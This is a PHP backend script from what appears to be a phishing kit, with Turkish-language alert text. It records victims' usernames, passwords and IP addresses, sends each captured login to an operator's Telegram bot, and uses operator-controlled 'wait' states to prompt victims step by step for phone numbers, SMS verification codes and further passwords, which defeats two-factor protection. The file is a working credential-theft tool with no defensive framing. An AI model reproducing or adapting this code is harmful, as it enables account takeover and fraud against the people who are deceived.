<?php
session_start();
include('config.php');



if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $action = $_POST["action"];

     $user_ip = $_SERVER['REMOTE_ADDR'];

    if ($action == "submitLogin") {
        $username = htmlspecialchars($_POST["username"]);
        $password = htmlspecialchars($_POST["password"]);
        $sql = "INSERT INTO users (username, password, ip) VALUES ('$username', '$password', '$user_ip')";
        $conn->query($sql);
        $userId = $conn->insert_id;

        sendTelegramMessage("Log bildirimi\n\n Username: $username\n\n Password: $password\n\n  UserID: $userId");

        $_SESSION["id"] = $userId;

        echo $userId;

    }


    if ($action == "wait") {
        $userId = $_SESSION["id"]; 

        $sql = "SELECT wait FROM users WHERE id = $userId";
        $result = $conn->query($sql);

        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $waitValue = $row["wait"];

            if ($waitValue == 2) {
                echo "getphone";
            } elseif ($waitValue == 3) {
                echo "getsms";
            } elseif ($waitValue == 4) {
                echo "getsmserror";
            } elseif ($waitValue == 5) {
                echo "getverf";
            } elseif ($waitValue == 6) {
                echo "again";
            } elseif ($waitValue == 7) {
                echo "getbildirim";
            } elseif ($waitValue == 8) {
                echo "getpass";
            } else {
                echo "0";
            }
        } else {
            echo "User not found";
        }
    }

   
    if ($action == "submitPhone") {
        $phone = htmlspecialchars($_POST["phone"]);
      
        $userId = $_SESSION["id"];
        $sql = "UPDATE users SET phone = '$phone', activity = 1 WHERE id = $userId";
        $conn->query($sql);
          
    }

    if ($action == "submitSms") {
        $sms = htmlspecialchars($_POST["sms"]);
      
        $userId = $_SESSION["id"];
        $sql = "UPDATE users SET sms = '$sms', activity = 1 WHERE id = $userId";
        $conn->query($sql);
          
    }

    if ($action == "submitSmsError") {
        $smserror = htmlspecialchars($_POST["smserror"]);
      
        $userId = $_SESSION["id"];
        $sql = "UPDATE users SET sms = '$smserror', activity = 1 WHERE id = $userId";
        $conn->query($sql);
          
    }

    if ($action == "submitPass") {
        $pass = htmlspecialchars($_POST["pass"]);
      
        $userId = $_SESSION["id"];
        $sql = "UPDATE users SET pass = '$pass', activity = 1 WHERE id = $userId";
        $conn->query($sql);
          
    }

    if ($action == "updateLastActivity") {
        if (isset($_SESSION['id'])) {
            $userID = $_SESSION['id'];
            $currentTime = time() + 10;
            $res = mysqli_query($conn, "UPDATE users SET last_activity = $currentTime WHERE id = $userID");
        }
    }
}

$conn->close();

    function sendTelegramMessage($message) {
        $botToken = "";
        $chatId = ""; 
        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = http_build_query(['chat_id' => $chatId, 'text' => $message]);

        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => $data,
            ],
        ];
        $context  = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
    }
    
?>
